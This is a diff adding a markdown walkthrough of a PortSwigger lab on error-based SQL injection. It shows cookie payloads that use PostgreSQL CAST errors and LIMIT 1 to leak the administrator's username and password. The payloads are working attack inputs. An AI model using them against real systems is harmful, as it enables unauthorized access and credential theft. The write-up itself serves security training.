@@ -1,0 +1,55 @@
+`Visible-Error-Based-SQLi.md`
+
+```markdown
+# PortSwigger Lab: Extracting sensitive data via verbose SQL error messages
+
+## 📝 Scenario Description
+This lab features a severe misconfiguration in the server backend's exception handling. When malicious or unexpected input is supplied to the `TrackingId` cookie, the application fails and prints verbose database error messages directly onto the screen (**PostgreSQL**). This allows an attacker to transform an initially blind parameter into a direct data extraction vector using text-based leaks.
+
+## 🧭 Step-by-Step Exploitation Methodology
+
+### Step 1: Verbose Error Analysis and Query Truncation
+Injecting a single quote (`'`) leaks the query structure within the server error message:
+```text
+Unterminated string literal started at position... SELECT * FROM tracking WHERE id = '''
+
+To sanitize our execution space and proceed interactively, we append comment characters (--) to neutralize the rest of the original developer's SQL string:
+SQL
+
+TrackingId=ogAZZfxtOKUELbuJ'--
+
+Result: HTTP 200 OK.
+Step 2: Crafting the Extraction Logic via CAST
+
+We trigger a data type conversion error by utilizing the CAST() function. We attempt to transform a text subquery into an incompatible integer (int) data type. The leading AND condition ensures the statement remains a valid boolean expression:
+SQL
+
+TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
+
+Result: HTTP 200 OK.
+Step 3: Character Limit Bypass
+
+When attempting to target the users table, the payload is cut off due to parameter length restrictions on the cookie. As a result, our comment characters (--) are dropped, breaking the syntax. To free up buffer space, we delete the original tracking token value completely:
+SQL
+
+TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
+
+Result: Database error indicating that the subquery unexpectedly returned more than one row.
+Step 4: Direct Credential Leaking
+
+We remediate the row count error by appending the LIMIT 1 clause to process the target records one by one:
+
+    Leaking the target username:
+    SQL
+
+    TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
+
+    Database Error Response: ERROR: invalid input syntax for type integer: "administrator"
+
+    Leaking the administrator password:
+    We switch the queried column from username to password:
+    SQL
+
+    TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
+
+    Database Error Response: ERROR: invalid input syntax for type integer:  gfsg45534ggfgfd
